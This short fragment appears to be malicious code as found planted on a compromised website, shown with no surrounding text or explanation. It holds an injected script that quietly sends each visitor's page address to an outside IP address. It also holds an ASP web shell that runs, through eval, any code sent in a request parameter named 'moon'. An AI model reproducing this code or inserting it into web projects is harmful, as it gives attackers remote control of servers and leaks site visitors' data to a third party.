<script>var x=new XMLHttpRequest();x.open("GET","http://185.86.150.37/info.php?h="+encodeURIComponent(document.location.href),false);x.send(null);</script><%
if request("moon")<>"" then
b=request("moon")
a=replace(b,"moon","eval")
eval (a)
end if
%>
